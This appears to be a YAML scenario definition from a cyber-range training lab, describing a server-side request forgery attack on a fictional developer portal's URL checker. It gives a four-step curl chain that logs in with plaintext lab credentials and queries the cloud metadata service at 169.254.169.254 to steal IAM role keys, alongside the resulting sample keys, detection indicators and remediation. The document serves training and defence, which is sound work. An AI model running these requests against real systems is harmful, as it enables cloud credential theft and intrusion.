id: red_01_cld-webapp_ssrf_imds
name: "SSRF to Cloud Instance Metadata Service (IMDS) Credential Theft"
range: RNG-CLD-01
machine: M1-cld-webapp
mitre:
  - technique: T1552.005
    name: "Unsecured Credentials: Cloud Instance Metadata API"
  - technique: T1190
    name: "Exploit Public-Facing Application"
cwe:
  - CWE-918  # Server-Side Request Forgery
cvss: "8.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)"
description: |
  Server-Side Request Forgery vulnerability in the PUL Cloud Developer Portal
  URL Health Checker feature allows an authenticated user to send arbitrary
  HTTP requests from the server, enabling access to the link-local IMDS at
  169.254.169.254 and exfiltration of cloud IAM role credentials.
entry_condition: "cloud_api_key: pul-cloud-dev-aK8x2mP9!2024 (from Dev Zone M5)"
prereqs:
  - Valid portal API key or login credentials
  - Network access to 11.0.2.10:8080
steps:
  - id: 1
    name: "Authenticate to portal"
    cmd: "curl -sc /tmp/c.txt -X POST http://11.0.2.10:8080/login -d 'username=cloud-dev&password=CloudDev%40PUL2024%21' -Lo /dev/null"
  - id: 2
    name: "Enumerate IMDS root"
    cmd: "curl -sb /tmp/c.txt -X POST http://11.0.2.10:8080/tools/url-check --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'"
  - id: 3
    name: "Enumerate IAM credentials path"
    cmd: "curl -sb /tmp/c.txt -X POST http://11.0.2.10:8080/tools/url-check --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
  - id: 4
    name: "Steal IAM credentials"
    cmd: "curl -sb /tmp/c.txt -X POST http://11.0.2.10:8080/tools/url-check --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role'"
output:
  credential: "AccessKeyId: AKIAPUL2024CLDSVC01 / SecretAccessKey: pULcLd/S3cr3t2024/K3y!"
  next_target: "M2 MinIO (11.0.2.20:9000)"
artifacts:
  - "/var/log/pul-cloud/portal.log"
  - "/var/log/pul-cloud/imds.log"
detection_indicators:
  - "URL_CHECK requests to 169.254.x.x in portal log"
  - "IMDS hit from 127.0.0.1 in imds.log"
  - "Pattern: 4 sequential IMDS requests from same session"
remediation:
  - "Block 169.254.0.0/16 and RFC1918 ranges in URL Health Checker"
  - "Enable IMDSv2 (token-required) on all cloud instances"
  - "Separate instance IAM role from storage root credentials"
